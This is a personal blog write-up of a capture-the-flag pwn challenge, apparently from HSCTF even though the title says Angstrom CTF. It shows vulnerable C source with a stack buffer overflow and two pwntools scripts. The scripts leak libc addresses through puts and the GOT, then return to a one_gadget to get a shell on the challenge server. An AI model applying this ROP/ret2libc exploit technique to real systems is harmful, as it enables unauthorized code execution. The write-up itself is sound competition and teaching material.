---
title: ex Writeup - Angstrom CTF 2023
date: 2023-06-14
description: 
tags: [writeups, ctfs, pwn]
---

I recently competed in HSCTF and placed 3rd in the high school division with my team `sl1th3r`. I was asked to make a writeup for this challenge for verification and decided to also just put it on here (more filler for my blog :D).

# The Challenge
{{< zoom-img src="img/chall.png" >}}

We're provided two files, the binary and the source code. The provided source can be seen below.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char** argv) {
	char input[24];
	char filename[24] = "\0";
	char buffer[128];
	FILE* f = NULL;
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 2, 0);
	if (argc > 1) {
		strncpy(filename, argv[1], 23);
	}
	while (1) {
		fgets(input, 128, stdin);
		input[strcspn(input, "\n")] = 0;
		if (input[0] == 'Q') {
			return 0;
		} else if (input[0] == 'f') {
			if (strlen(input) >= 3) {
				strcpy(filename, input + 2);
			}

			if (filename[0] == '\0') {
				puts("?");
			} else {
				puts(filename);
			}
		} else if (input[0] == 'l') {
			if (filename[0] == '\0') {
				puts("?");
			} else {
				if (strchr(filename, '/') != NULL) {
					puts("?");
					continue;
				}

				f = fopen(filename, "r");
				if (f == NULL) {
					puts("?");
					continue;
				}
				while (fgets(buffer, 128, f)) {
					printf("%s", buffer);
				}
				fclose(f);
			}
		} else {
			puts("?");
		}
	}
}
```

Obviously, theres one line here that sticks out.

```c
fgets(input, 128, stdin);
```

Now we have a pretty good direction of where to go for this challenge. Now we can check the protections on the binary to see if we'll need to do anything extra.

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Everything looks great. No annoying canary to deal with and no weird leaks needed, right?

After looking through gadgets in the binary, there's nothing we can really do with them. That only leaves us with one more choice, using libc gadgets. But how can we do that if we aren't given a libc to work with? Well, we're able to leak the addresses of specific functions by passing its address in the GOT as an argument to `puts`. And I also recently happened to find out about a cool site ([libc.blukat.me](https://libc.blukat.me/)) that allows us to give it two addresses of functions and it'll tell us the libc. It does this by comparing the offsets between the two functions to other libc's and seeing what matches. We're able to leak two libc addresses using the following script.

```py
from pwn import *

elf = context.binary = ELF("./ex")

if args.REMOTE:
    io = remote("ex.hsctf.com", 1337)
else:
    io = process("./ex")

pop_rdi = p64(0x00000000004014f3)

def leak_addr(name):
    return pop_rdi+p64(elf.got[name])+p64(elf.plt["puts"])

payload = b'Q'+b'a'*39
payload += leak_addr("__libc_start_main")
payload += leak_addr("puts")
payload += p64(elf.symbols["main"])

io.sendline(payload)

print(elf.got)

leak1 = u64(io.recvline(keepends=False)+b'\x00\x00')
leak2 = u64(io.recvline(keepends=False)+b'\x00\x00')

print(hex(leak1))
print(hex(leak2))

io.interactive()
```

Using this, we get the following output on remote.

```
0x7f4a76cd8f90
0x7f4a76d39420
```

Inputting these values into the site I mentioned earlier, we get only one possible result.

{{< zoom-img src="img/libc-result.png" >}}

Thankfully the site also lets us download the libc. Using this, we can now use a basic libc leak to return to a one_gadget present in the libc.

I used the following script for this.

```py
from pwn import *

elf = context.binary = ELF("./ex")

libc = ELF("./libc.so.6")

if args.REMOTE:
    io = remote("ex.hsctf.com", 1337)
else:
    io = process("./ex")

pop_rnum = p64(0x00000000004014ec)
pop_rdi = p64(0x00000000004014f3)
one_gadget = 0xe3afe

payload = b'Q'+b'a'*39
payload += pop_rdi
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])

io.sendline(payload)

leak = u64(io.recvline()[:-1]+b"\x00\x00")

libc.address = leak - libc.symbols["puts"]

print(hex(libc.address+one_gadget))

payload = b'Q'+b'a'*39
payload += pop_rnum
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(libc.address+one_gadget)

io.sendline(payload)

io.interactive()
```

I'm not sure why, but for some reason this script only works around 1/2 of the time? I can't really test why locally (my computer hates when I used a different libc on a binary) but if the script works then I guess theres no reason to complain. After popping shell, I check the root directory since I knew the flag wasn't going to be in the local directory (then you could just read it without the whole exploit) and there it was.

```
bin
boot
dev
etc
flag.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

Running `cat /flag.txt` gives us our flag :D

`flag{I_wonder_if_there's_an_emacs_command_for_writing_pwn_exploits?}`
